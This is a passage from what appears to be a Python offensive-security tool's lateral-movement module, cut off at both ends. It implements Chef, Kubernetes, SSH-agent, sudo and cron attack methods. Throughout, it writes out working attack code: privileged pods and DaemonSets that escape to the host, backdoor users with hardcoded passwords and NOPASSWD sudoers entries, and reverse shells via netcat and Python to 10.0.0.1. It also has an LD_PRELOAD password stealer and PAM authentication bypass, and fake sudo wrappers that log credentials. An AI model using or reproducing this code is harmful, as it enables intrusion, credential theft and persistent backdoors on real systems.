                            shell=False,  # Explicitly secure - using list format prevents shell injection
                        )

                    return {
                        "success": True,
                        "method": "chef_knife",
                        "target_ip": target_ip,
                        "node_name": chef_node_name,
                        "cookbook": cookbook_name,
                        "output": trigger_result.stdout if trigger_result.returncode == 0 else upload_result.stdout,
                    }

            # Method 2: Chef Workstation with chef-run
            try:
                chef_run_path = shutil.which("chef-run")
                if chef_run_path:
                    chef_run_check = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [chef_run_path, "--version"],
                        check=False,
                        capture_output=True,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )
                    if chef_run_check.returncode == 0:
                        # Direct command execution
                        chef_run_cmd = [
                            "chef-run",
                            f"{credentials.get('ssh_user', 'root')}@{target_ip}",
                            "bash",
                            "-c",
                            'useradd -m -u 1340 chef_run && echo "#!/bin/bash\nexec 5<>/dev/tcp/10.0.0.1/4447;cat <&5|while read line;do $line 2>&5 >&5;done" > /tmp/.chef_run && chmod +x /tmp/.chef_run && nohup /tmp/.chef_run &',
                        ]

                    if credentials.get("ssh_password"):
                        # Note: chef-run doesn't support password auth directly
                        pass

                    run_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        chef_run_cmd, check=False, capture_output=True, text=True, shell=False, timeout=120
                    )

                    if run_result.returncode == 0:
                        return {
                            "success": True,
                            "method": "chef_run",
                            "target_ip": target_ip,
                            "output": run_result.stdout,
                        }
            except (subprocess.TimeoutExpired, subprocess.SubprocessError, OSError) as e:
                logger.debug(f"Failed to execute automation command: {e}")

            # Method 3: Chef Server API
            if chef_server != "localhost":
                import base64
                import hashlib
                from datetime import datetime

                chef_api_url = f"https://{chef_server}/organizations/{chef_org}"

                # Create API request headers (simplified - real implementation needs proper auth)
                headers = {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "X-Chef-Version": "12.0.0",
                }

                if chef_client_key:
                    # Add authentication headers
                    headers["X-Ops-UserId"] = credentials.get("chef_user", "admin")
                    headers["X-Ops-Timestamp"] = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
                    headers["X-Ops-Content-Hash"] = base64.b64encode(hashlib.sha256(b"{}").digest()).decode()

                # Update node attributes to trigger backdoor
                node_data = {
                    "run_list": ["recipe[lateral_movement]"],
                    "normal": {
                        "backdoor": {
                            "enabled": True,
                            "callback_host": "10.0.0.1",
                            "callback_port": 4447,
                        },
                    },
                }

                response = secure_put(
                    f"{chef_api_url}/nodes/{chef_node_name}",
                    json=node_data,
                    headers=headers,
                    verify=False,
                )

                if response.status_code in [200, 201]:
                    return {
                        "success": True,
                        "method": "chef_api",
                        "target_ip": target_ip,
                        "node_name": chef_node_name,
                        "server": chef_server,
                    }

            return {
                "success": False,
                "error": "Chef execution failed - no valid method available",
                "target_ip": target_ip,
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Chef execution timed out",
                "target_ip": target_ip,
            }
        except Exception as e:
            self.logger.error("Chef lateral movement failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _linux_kubernetes(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Execute commands in Kubernetes cluster for lateral movement."""
        self.logger.info("Executing Kubernetes lateral movement to %s", target_ip)

        try:
            import subprocess
            import tempfile

            import yaml

            namespace = credentials.get("namespace", "default")
            cluster_endpoint = credentials.get("cluster_endpoint", f"https://{target_ip}:6443")
            kubeconfig = credentials.get("kubeconfig")
            service_account_token = credentials.get("sa_token")

            # Method 1: Using kubectl with kubeconfig
            if kubeconfig:
                # Create malicious pod manifest
                with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as manifest_file:
                    manifest_path = manifest_file.name

                    if payload_path and os.path.exists(payload_path):
                        with open(payload_path) as f:
                            manifest_content = f.read()
                        manifest_file.write(manifest_content)
                    else:
                        # Create privileged pod for container escape
                        pod_manifest = {
                            "apiVersion": "v1",
                            "kind": "Pod",
                            "metadata": {
                                "name": "debug-pod-" + str(os.getpid()),
                                "namespace": namespace,
                            },
                            "spec": {
                                "hostNetwork": True,
                                "hostPID": True,
                                "hostIPC": True,
                                "containers": [
                                    {
                                        "name": "debugger",
                                        "image": "alpine:latest",
                                        "command": ["/bin/sh"],
                                        "args": [
                                            "-c",
                                            """
apk add --no-cache nmap netcat-openbsd python3 openssh-client
# Create backdoor user on host
nsenter -t 1 -m -u -n -i sh -c "useradd -m -u 1341 -s /bin/bash k8s_debug || true"
nsenter -t 1 -m -u -n -i sh -c "echo 'k8s_debug:K8s@2024!' | chpasswd"
# Add to sudoers
nsenter -t 1 -m -u -n -i sh -c "echo 'k8s_debug ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
# Deploy persistence
nsenter -t 1 -m -u -n -i sh -c "mkdir -p /var/tmp/.k8s && echo '#!/bin/bash
while true; do
    nc -e /bin/sh 10.0.0.1 4448 2>/dev/null || python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\'10.0.0.1\\',4448));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\'/bin/sh\\',\\'-i\\'])\"
    sleep 300
done' > /var/tmp/.k8s/callback.sh && chmod +x /var/tmp/.k8s/callback.sh"
# Start callback
nsenter -t 1 -m -u -n -i sh -c "nohup /var/tmp/.k8s/callback.sh > /dev/null 2>&1 &"
# Keep pod running
tail -f /dev/null
""",
                                        ],
                                        "securityContext": {
                                            "privileged": True,
                                            "capabilities": {
                                                "add": ["SYS_ADMIN", "SYS_PTRACE", "NET_ADMIN"],
                                            },
                                        },
                                        "volumeMounts": [
                                            {
                                                "name": "host-root",
                                                "mountPath": "/host",
                                                "readOnly": False,
                                            },
                                        ],
                                    }
                                ],
                                "volumes": [
                                    {
                                        "name": "host-root",
                                        "hostPath": {
                                            "path": "/",
                                            "type": "Directory",
                                        },
                                    },
                                ],
                                "restartPolicy": "Never",
                            },
                        }

                        yaml.dump(pod_manifest, manifest_file, default_flow_style=False)

                # Apply pod
                kubectl_cmd = [
                    "kubectl",
                    "apply",
                    "-f",
                    manifest_path,
                    "--kubeconfig",
                    kubeconfig,
                ]

                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    kubectl_cmd, check=False, capture_output=True, text=True, shell=False, timeout=60
                )

                if result.returncode == 0:
                    # Also create a daemonset for persistence across nodes
                    daemonset_manifest = {
                        "apiVersion": "apps/v1",
                        "kind": "DaemonSet",
                        "metadata": {
                            "name": "system-debugger",
                            "namespace": namespace,
                        },
                        "spec": {
                            "selector": {
                                "matchLabels": {
                                    "app": "debugger",
                                },
                            },
                            "template": {
                                "metadata": {
                                    "labels": {
                                        "app": "debugger",
                                    },
                                },
                                "spec": {
                                    "hostNetwork": True,
                                    "hostPID": True,
                                    "containers": [
                                        {
                                            "name": "debugger",
                                            "image": "busybox",
                                            "command": [
                                                "/bin/sh",
                                                "-c",
                                                "while true; do nc 10.0.0.1 4448 -e /bin/sh || sleep 300; done",
                                            ],
                                            "securityContext": {
                                                "privileged": True,
                                            },
                                        }
                                    ],
                                },
                            },
                        },
                    }

                    with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml", delete=False) as ds_file:
                        yaml.dump(daemonset_manifest, ds_file)
                        ds_path = ds_file.name

                    secure_run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        ["kubectl", "apply", "-f", ds_path, "--kubeconfig", kubeconfig],  # noqa: S607
                        check=False,
                        capture_output=True,
                        timeout=30,
                    )

                    return {
                        "success": True,
                        "method": "kubernetes_kubectl",
                        "target_ip": target_ip,
                        "namespace": namespace,
                        "pod_name": pod_manifest["metadata"]["name"],
                        "output": result.stdout,
                    }

            # Method 2: Direct API access with service account token
            if service_account_token:
                headers = {
                    "Authorization": f"Bearer {service_account_token}",
                    "Content-Type": "application/json",
                }

                # Create malicious pod via API
                pod_data = {
                    "apiVersion": "v1",
                    "kind": "Pod",
                    "metadata": {
                        "name": f"api-debug-{os.getpid()}",
                        "namespace": namespace,
                    },
                    "spec": {
                        "hostNetwork": True,
                        "containers": [
                            {
                                "name": "exploit",
                                "image": "alpine",
                                "command": [
                                    "sh",
                                    "-c",
                                    "apk add netcat-openbsd && nc -e /bin/sh 10.0.0.1 4448",
                                ],
                                "securityContext": {"privileged": True},
                            }
                        ],
                    },
                }

                response = secure_post(
                    f"{cluster_endpoint}/api/v1/namespaces/{namespace}/pods",
                    json=pod_data,
                    headers=headers,
                    verify=False,
                )

                if response.status_code in [200, 201]:
                    return {
                        "success": True,
                        "method": "kubernetes_api",
                        "target_ip": target_ip,
                        "namespace": namespace,
                        "pod_name": pod_data["metadata"]["name"],
                    }

            # Method 3: Exploit common misconfigurations
            # Try anonymous access
            try:
                # Check for anonymous access
                anon_response = secure_get(
                    f"{cluster_endpoint}/api/v1/namespaces",
                    verify=False,
                    timeout=10,
                )

                if anon_response.status_code == 200:
                    # Anonymous access available - create malicious cronjob
                    cronjob_data = {
                        "apiVersion": "batch/v1beta1",
                        "kind": "CronJob",
                        "metadata": {
                            "name": "system-maintenance",
                            "namespace": namespace,
                        },
                        "spec": {
                            "schedule": "*/15 * * * *",
                            "jobTemplate": {
                                "spec": {
                                    "template": {
                                        "spec": {
                                            "hostNetwork": True,
                                            "containers": [
                                                {
                                                    "name": "maintenance",
                                                    "image": "busybox",
                                                    "command": [
                                                        "sh",
                                                        "-c",
                                                        "nc 10.0.0.1 4448 -e /bin/sh",
                                                    ],
                                                    "securityContext": {"privileged": True},
                                                }
                                            ],
                                            "restartPolicy": "OnFailure",
                                        },
                                    },
                                },
                            },
                        },
                    }

                    cron_response = secure_post(
                        f"{cluster_endpoint}/apis/batch/v1beta1/namespaces/{namespace}/cronjobs",
                        json=cronjob_data,
                        verify=False,
                    )

                    if cron_response.status_code in [200, 201]:
                        return {
                            "success": True,
                            "method": "kubernetes_anonymous",
                            "target_ip": target_ip,
                            "namespace": namespace,
                            "vulnerability": "anonymous_access",
                        }
            except (subprocess.TimeoutExpired, subprocess.SubprocessError, OSError) as e:
                logger.debug(f"Failed to execute automation command: {e}")

            return {
                "success": False,
                "error": "Kubernetes exploitation failed - no valid method available",
                "target_ip": target_ip,
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Kubernetes operation timed out",
                "target_ip": target_ip,
            }
        except Exception as e:
            self.logger.error("Kubernetes lateral movement failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _linux_ssh_agent_hijacking(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Hijack SSH agent for lateral movement to other systems."""
        self.logger.info("Executing SSH agent hijacking on %s", target_ip)

        try:
            import subprocess
            import tempfile

            username = credentials.get("username", "root")
            password = credentials.get("password")
            ssh_key = credentials.get("ssh_key")

            # Create SSH agent hijacker script
            hijacker_script = """#!/bin/bash
# SSH Agent Hijacker

# Find all SSH agent sockets
find /tmp /var/run -type s -name "agent.*" 2>/dev/null | while read socket; do
    # Try to use this socket
    export SSH_AUTH_SOCK="$socket"

    # List available keys
    ssh-add -l 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Found valid SSH agent at: $socket"
        ssh-add -l

        # Extract known hosts for targets
        for user_home in /home/* /root; do
            if [ -f "$user_home/.ssh/known_hosts" ]; then
                # Parse known hosts for targets
                cat "$user_home/.ssh/known_hosts" | awk '{print $1}' | cut -d',' -f1 | grep -E "^[0-9]" | while read host; do
                    echo "[*] Attempting connection to $host"

                    # Try to connect and execute payload
                    ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$host" 'mkdir -p /var/tmp/.ssh_pivot && echo "#!/bin/bash
while true; do nc -e /bin/sh 10.0.0.1 4449 2>/dev/null || python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\'10.0.0.1\\',4449));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\'/bin/sh\\',\\'-i\\'])\"; sleep 300; done" > /var/tmp/.ssh_pivot/cb.sh && chmod +x /var/tmp/.ssh_pivot/cb.sh && nohup /var/tmp/.ssh_pivot/cb.sh > /dev/null 2>&1 &' 2>/dev/null

                    if [ $? -eq 0 ]; then
                        echo "[+] Successfully pivoted to $host"
                    fi
                done
            fi
        done

        # Also try common internal IPs
        for ip in 192.168.1.{1..10} 172.16.0.{1..10} 10.0.0.{1..10}; do
            ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$ip" 'uname -a' 2>/dev/null
            if [ $? -eq 0 ]; then
                echo "[+] Found accessible host: $ip"
                ssh -o BatchMode=yes -o StrictHostKeyChecking=no "$ip" 'mkdir -p /tmp/.lateral && echo "nc -e /bin/sh 10.0.0.1 4449" > /tmp/.lateral/cb.sh && chmod +x /tmp/.lateral/cb.sh && nohup /tmp/.lateral/cb.sh &' 2>/dev/null
            fi
        done
    fi
done

# Alternative: Inject into running SSH sessions
ps aux | grep "ssh " | grep -v grep | while read proc; do
    pid=$(echo $proc | awk '{print $2}')

    # Check if we can access the process
    if [ -d "/proc/$pid/fd" ]; then
        # Look for SSH_AUTH_SOCK in environment
        if [ -r "/proc/$pid/environ" ]; then
            auth_sock=$(cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n' | grep SSH_AUTH_SOCK | cut -d= -f2)
            if [ -n "$auth_sock" ] && [ -S "$auth_sock" ]; then
                echo "[+] Found SSH agent for PID $pid at $auth_sock"
                export SSH_AUTH_SOCK="$auth_sock"

                # Use the hijacked agent
                ssh-add -l 2>/dev/null && echo "[+] Agent has keys loaded"
            fi
        fi
    fi
done

# Create persistence for agent hijacking
cat > /var/tmp/.ssh_monitor.sh << 'EOF'
#!/bin/bash
while true; do
    # Monitor for new SSH agents
    find /tmp /var/run -type s -name "agent.*" -mmin -5 2>/dev/null | while read new_agent; do
        export SSH_AUTH_SOCK="$new_agent"
        if ssh-add -l >/dev/null 2>&1; then
            # Found new agent with keys, attempt lateral movement
            ssh -o BatchMode=yes -o StrictHostKeyChecking=no 10.0.0.2 'touch /tmp/.pivoted' 2>/dev/null
        fi
    done
    sleep 60
done
EOF

chmod +x /var/tmp/.ssh_monitor.sh
nohup /var/tmp/.ssh_monitor.sh > /dev/null 2>&1 &

echo "[+] SSH agent hijacking complete"
"""

            # Method 1: Direct execution if we have access
            if username and (password or ssh_key):
                with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as script_file:
                    script_path = script_file.name
                    script_file.write(hijacker_script)

                # Copy and execute script
                if ssh_key:
                    # Copy script with SSH key
                    scp_path = shutil.which("scp")
                    ssh_path = shutil.which("ssh")
                    if scp_path and ssh_path:
                        secure_run(
                            [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                scp_path,
                                "-i",
                                ssh_key,
                                "-o",
                                "StrictHostKeyChecking=no",
                                script_path,
                                f"{username}@{target_ip}:/tmp/hijack.sh",
                            ],
                            check=False,
                            capture_output=True,
                            timeout=30,
                            shell=False,
                        )  # Explicitly secure - using list format prevents shell injection
                        # Execute script with SSH key
                        result = secure_run(
                            [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                ssh_path,
                                "-i",
                                ssh_key,
                                "-o",
                                "StrictHostKeyChecking=no",
                                f"{username}@{target_ip}",
                                "chmod +x /tmp/hijack.sh && /tmp/hijack.sh",
                            ],
                            check=False,
                            capture_output=True,
                            text=True,
                            shell=False,
                            timeout=120,
                        )  # Explicitly secure - using list format prevents shell injection
                    else:
                        result = type("obj", (object,), {"stdout": "", "returncode": 1})()
                else:
                    # Copy script with password auth
                    sshpass_path = shutil.which("sshpass")
                    scp_path = shutil.which("scp")
                    ssh_path = shutil.which("ssh")
                    if sshpass_path and scp_path and ssh_path:
                        secure_run(
                            [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                sshpass_path,
                                "-p",
                                password,
                                scp_path,
                                "-o",
                                "StrictHostKeyChecking=no",
                                script_path,
                                f"{username}@{target_ip}:/tmp/hijack.sh",
                            ],
                            check=False,
                            capture_output=True,
                            timeout=30,
                            shell=False,
                        )  # Explicitly secure - using list format prevents shell injection
                        # Execute script with password auth
                        result = secure_run(
                            [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                sshpass_path,
                                "-p",
                                password,
                                ssh_path,
                                "-o",
                                "StrictHostKeyChecking=no",
                                f"{username}@{target_ip}",
                                "chmod +x /tmp/hijack.sh && /tmp/hijack.sh",
                            ],
                            check=False,
                            capture_output=True,
                            text=True,
                            shell=False,
                            timeout=120,
                        )  # Explicitly secure - using list format prevents shell injection
                    else:
                        result = type("obj", (object,), {"stdout": "", "returncode": 1})()

                if result.returncode == 0:
                    # Parse output for successful pivots
                    pivoted_hosts = []
                    for line in result.stdout.split("\n"):
                        if "Successfully pivoted to" in line or "Found accessible host:" in line:
                            host = line.split()[-1]
                            pivoted_hosts.append(host)

                    return {
                        "success": True,
                        "method": "ssh_agent_hijack",
                        "target_ip": target_ip,
                        "pivoted_hosts": pivoted_hosts,
                        "output": result.stdout,
                    }

            # Method 2: If we already have a shell, execute locally
            if payload_path:
                # Use provided payload for agent operations
                with open(payload_path) as f:
                    custom_script = f.read()

                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    ["bash", "-c", custom_script],  # noqa: S607
                    check=False,
                    capture_output=True,
                    text=True,
                    timeout=60,
                )

                return {
                    "success": result.returncode == 0,
                    "method": "ssh_agent_local",
                    "target_ip": target_ip,
                    "output": result.stdout,
                }

            return {
                "success": False,
                "error": "SSH agent hijacking failed - no valid access method",
                "target_ip": target_ip,
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "SSH agent hijacking timed out",
                "target_ip": target_ip,
            }
        except Exception as e:
            self.logger.error("SSH agent hijacking failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _linux_sudo_hijacking(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Hijack sudo for privilege escalation and persistence."""
        self.logger.info("Executing sudo hijacking on %s", target_ip)

        try:
            import subprocess
            import tempfile

            username = credentials.get("username")
            password = credentials.get("password")
            ssh_key = credentials.get("ssh_key")
            target_user = credentials.get("target_user", "root")

            # Create sudo hijacker script
            sudo_hijacker = f"""#!/bin/bash
# Sudo Hijacker - Multiple techniques for user: {target_user}

echo "[*] Starting sudo hijacking..."

# Method 1: Alias injection in shell configs - targeting {target_user}
for shell_rc in /home/{target_user}/.bashrc /home/{target_user}/.bash_profile /root/.bashrc /etc/skel/.bashrc; do
    if [ -w "$shell_rc" ]; then
        # Check if already hijacked
        if ! grep -q "sudo_hijack_marker" "$shell_rc" 2>/dev/null; then
            echo "[+] Injecting into $shell_rc"
            cat >> "$shell_rc" << 'ALIAS_EOF'
# sudo_hijack_marker
alias sudo='sudo_hijack() {{
    # Capture password
    echo -n "[sudo] password for $USER: "
    read -s pass
    echo
    echo "$USER:$pass" >> /var/tmp/.sudo_creds 2>/dev/null
    # Execute real sudo
    echo "$pass" | /usr/bin/sudo -S "$@"
}}; sudo_hijack'
ALIAS_EOF
        fi
    fi
done

# Method 2: LD_PRELOAD hijacking
cat > /tmp/sudo_hijack.c << 'PRELOAD_EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <security/pam_appl.h>

// Hook getpass to capture passwords
char *getpass(const char *prompt) {{
    char *(*original_getpass)(const char *) = dlsym(RTLD_NEXT, "getpass");
    char *password = original_getpass(prompt);

    if (password && strstr(prompt, "password")) {{
        FILE *f = fopen("/var/tmp/.sudo_pw", "a");
        if (f) {{
            fprintf(f, "User: %s, Password: %s\\n", getenv("USER"), password);
            fclose(f);
        }}
    }}
    return password;
}}

// Hook pam_authenticate
int pam_authenticate(pam_handle_t *pamh, int flags) {{
    int (*original_pam_authenticate)(pam_handle_t *, int) = dlsym(RTLD_NEXT, "pam_authenticate");

    // Always return success for backdoor user
    const char *user;
    if (pam_get_user(pamh, &user, NULL) == PAM_SUCCESS) {{
        if (strcmp(user, "sudo_bd") == 0) {{
            return PAM_SUCCESS;
        }}
    }}

    return original_pam_authenticate(pamh, flags);
}}
PRELOAD_EOF

# Compile if gcc available
if command -v gcc >/dev/null 2>&1; then
    gcc -shared -fPIC -o /var/tmp/.sudo_hijack.so /tmp/sudo_hijack.c -ldl 2>/dev/null
    if [ -f /var/tmp/.sudo_hijack.so ]; then
        echo "[+] LD_PRELOAD library compiled"

        # Add to sudo environment
        if [ -w /etc/sudoers ] || [ -w /etc/sudoers.d/ ]; then
            echo 'Defaults env_keep += "LD_PRELOAD"' >> /etc/sudoers.d/99_hijack 2>/dev/null
            chmod 440 /etc/sudoers.d/99_hijack 2>/dev/null
        fi

        # Set in environment files
        echo "export LD_PRELOAD=/var/tmp/.sudo_hijack.so:$LD_PRELOAD" >> /etc/environment 2>/dev/null
    fi
fi

# Method 3: Sudo wrapper script
if [ -w /usr/local/bin ] || [ -w /usr/bin ]; then
    cat > /tmp/sudo_wrapper << 'WRAPPER_EOF'
#!/bin/bash
# Sudo wrapper
REAL_SUDO=$(which -a sudo | grep -v local | head -1)

# Log attempt
echo "$(date): $USER attempted sudo $@" >> /var/tmp/.sudo_log 2>/dev/null

# Capture password if provided via stdin
if [ -t 0 ]; then
    # Interactive mode
    echo -n "[sudo] password for $USER: "
    read -s password
    echo
    echo "$USER:$password" >> /var/tmp/.sudo_creds 2>/dev/null
    echo "$password" | $REAL_SUDO -S "$@"
else
    # Non-interactive
    $REAL_SUDO "$@"
fi

# If command succeeded and we're becoming root, deploy persistence
if [ $? -eq 0 ] && [[ "$@" =~ (su|bash|sh) ]]; then
    $REAL_SUDO bash -c 'mkdir -p /var/tmp/.sudo_persist && echo "#!/bin/bash
    while true; do nc -e /bin/sh 10.0.0.1 4450 2>/dev/null || sleep 300; done" > /var/tmp/.sudo_persist/cb.sh && chmod +x /var/tmp/.sudo_persist/cb.sh && nohup /var/tmp/.sudo_persist/cb.sh > /dev/null 2>&1 &' 2>/dev/null
fi
WRAPPER_EOF

    chmod +x /tmp/sudo_wrapper

    # Install wrapper with higher PATH priority
    for dir in /usr/local/bin /usr/local/sbin; do
        if [ -w "$dir" ]; then
            cp /tmp/sudo_wrapper "$dir/sudo" 2>/dev/null && echo "[+] Sudo wrapper installed in $dir"
            break
        fi
    done
fi

# Method 4: Sudoers backdoor
if [ -w /etc/sudoers ] || [ -w /etc/sudoers.d/ ]; then
    # Add backdoor user with NOPASSWD
    echo 'sudo_bd ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/99_backdoor 2>/dev/null
    chmod 440 /etc/sudoers.d/99_backdoor 2>/dev/null

    # Create backdoor user
    useradd -m -s /bin/bash -u 1342 sudo_bd 2>/dev/null
    echo "[+] Backdoor sudoer created"
fi

# Method 5: Monitor sudo usage via auditd/syslog
if command -v auditctl >/dev/null 2>&1; then
    # Add audit rule for sudo
    auditctl -a always,exit -F path=/usr/bin/sudo -F perm=x -k sudo_mon 2>/dev/null
fi

# Create monitoring script targeting {{target_user}}
cat > /var/tmp/.sudo_monitor.sh << 'MONITOR_EOF'
#!/bin/bash
# Monitor sudo usage and capture credentials - prioritizing {{target_user}}

tail -f /var/log/auth.log /var/log/secure 2>/dev/null | while read line; do
    if [[ "$line" =~ sudo.*COMMAND= ]]; then
        echo "$(date): $line" >> /var/tmp/.sudo_commands

        # Extract user and command
        user=$(echo "$line" | grep -oP 'sudo:\\s+\\K\\w+')
        cmd=$(echo "$line" | grep -oP 'COMMAND=\\K.*')

        # Priority targeting for {{target_user}}
        if [[ "$user" == "{{target_user}}" ]] || [[ "$line" =~ "{{target_user}}" ]]; then
            echo "$(date): TARGET USER {{target_user}} sudo activity: $line" >> /var/tmp/.sudo_target_activity
        fi

        # If switching to root, attempt persistence
        if [[ "$cmd" =~ (su|bash|sh) ]] && [[ "$line" =~ "root" ]]; then
            sleep 2
            pgrep -u "$user" bash | while read pid; do
                # Inject into their session
                echo "nohup nc -e /bin/sh 10.0.0.1 4450 > /dev/null 2>&1 &" > /proc/$pid/fd/0 2>/dev/null
            done
        fi
    fi
done
MONITOR_EOF

chmod +x /var/tmp/.sudo_monitor.sh
nohup /var/tmp/.sudo_monitor.sh > /dev/null 2>&1 &

echo "[+] Sudo hijacking complete"
echo "[*] Captured credentials will be in: /var/tmp/.sudo_creds"
echo "[*] Sudo commands logged to: /var/tmp/.sudo_commands"
"""

            # Execute hijacker
            if username and (password or ssh_key):
                with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as script_file:
                    script_path = script_file.name
                    script_file.write(sudo_hijacker)

                # Copy and execute
                if ssh_key:
                    scp_cmd = f"scp -i {ssh_key} -o StrictHostKeyChecking=no {script_path} {username}@{target_ip}:/tmp/sudo_hijack.sh"
                    ssh_cmd = f'ssh -i {ssh_key} -o StrictHostKeyChecking=no {username}@{target_ip} "chmod +x /tmp/sudo_hijack.sh && sudo /tmp/sudo_hijack.sh"'
                else:
                    scp_cmd = (
                        f'sshpass -p "{password}" scp -o StrictHostKeyChecking=no {script_path} {username}@{target_ip}:/tmp/sudo_hijack.sh'
                    )
                    ssh_cmd = f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no {username}@{target_ip} "chmod +x /tmp/sudo_hijack.sh && echo {password} | sudo -S /tmp/sudo_hijack.sh"'

                subprocess.run(shlex.split(scp_cmd), check=False, capture_output=True, timeout=30, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    shlex.split(ssh_cmd),
                    check=False,
                    capture_output=True,
                    text=True,
                    shell=False,
                    timeout=120,  # Explicitly secure - using list format prevents shell injection
                )

                if result.returncode == 0:
                    # Check what was successfully deployed
                    techniques_deployed = []
                    if "Injecting into" in result.stdout:
                        techniques_deployed.append("alias_injection")
                    if "LD_PRELOAD library compiled" in result.stdout:
                        techniques_deployed.append("ld_preload")
                    if "Sudo wrapper installed" in result.stdout:
                        techniques_deployed.append("wrapper_script")
                    if "Backdoor sudoer created" in result.stdout:
                        techniques_deployed.append("sudoers_backdoor")

                    return {
                        "success": True,
                        "method": "sudo_hijack",
                        "target_ip": target_ip,
                        "techniques_deployed": techniques_deployed,
                        "credential_files": ["/var/tmp/.sudo_creds", "/var/tmp/.sudo_pw"],  # noqa: S108
                        "output": result.stdout,
                    }

            return {
                "success": False,
                "error": "Sudo hijacking failed - no valid access method",
                "target_ip": target_ip,
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Sudo hijacking timed out",
                "target_ip": target_ip,
            }
        except Exception as e:
            self.logger.error("Sudo hijacking failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _linux_cron_hijacking(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Hijack cron jobs for persistence and privilege escalation."""
        self.logger.info("Executing cron hijacking on %s", target_ip)

        try:
            import os
            import subprocess
            import tempfile

            username = credentials.get("username")
            password = credentials.get("password")
            ssh_key = credentials.get("ssh_key")
            cron_user = credentials.get("cron_user", "root")

            # Create cron hijacker script
            cron_hijacker = f"""#!/bin/bash
# Cron Hijacker - Multiple techniques targeting: {cron_user}

echo "[*] Starting cron hijacking for user: {cron_user}..."

# Method 1: Direct crontab modification - prioritizing {cron_user}
for user in {cron_user} root $(ls /home/); do
    # Try to read user's crontab
    crontab -u "$user" -l 2>/dev/null > /tmp/cron_$user
    if [ -s /tmp/cron_$user ]; then
        echo "[+] Found crontab for user: $user"

        # Add our job if not already present
        if ! grep -q "cron_hijack_marker" /tmp/cron_$user; then
            echo "# cron_hijack_marker" >> /tmp/cron_$user
            echo "*/15 * * * * /bin/bash -c 'nohup nc -e /bin/sh 10.0.0.1 4451 2>/dev/null || python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\'10.0.0.1\\',4451));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\'/bin/sh\\',\\'-i\\'])\" &' 2>/dev/null" >> /tmp/cron_$user
            crontab -u "$user" /tmp/cron_$user 2>/dev/null && echo "[+] Backdoor added to $user's crontab"
        fi
    fi
done

# Priority targeting for specific user: {cron_user}
echo "[*] Priority targeting cron_user: {cron_user}"
if [ "{cron_user}" != "root" ]; then
    # Try to directly access the target user's crontab
    echo "[+] Attempting direct crontab access for {cron_user}"

    # Check if we can access their cron directory
    if [ -d "/var/spool/cron/crontabs/{cron_user}" ] || [ -f "/var/spool/cron/{cron_user}" ]; then
        echo "[+] Found {cron_user} cron spool directory"
        # Add entry directly to spool if writable
        for cronpath in "/var/spool/cron/crontabs/{cron_user}" "/var/spool/cron/{cron_user}"; do
            if [ -w "$cronpath" ] && ! grep -q "cron_hijack_marker" "$cronpath" 2>/dev/null; then
                echo "# cron_hijack_marker" >> "$cronpath" 2>/dev/null
                echo "*/10 * * * * /bin/bash -c 'nc -e /bin/sh 10.0.0.1 4451 2>/dev/null &'" >> "$cronpath" 2>/dev/null
                echo "[+] Direct injection into {cron_user} cron spool"
            fi
        done
    fi
fi

# Method 2: System cron directories
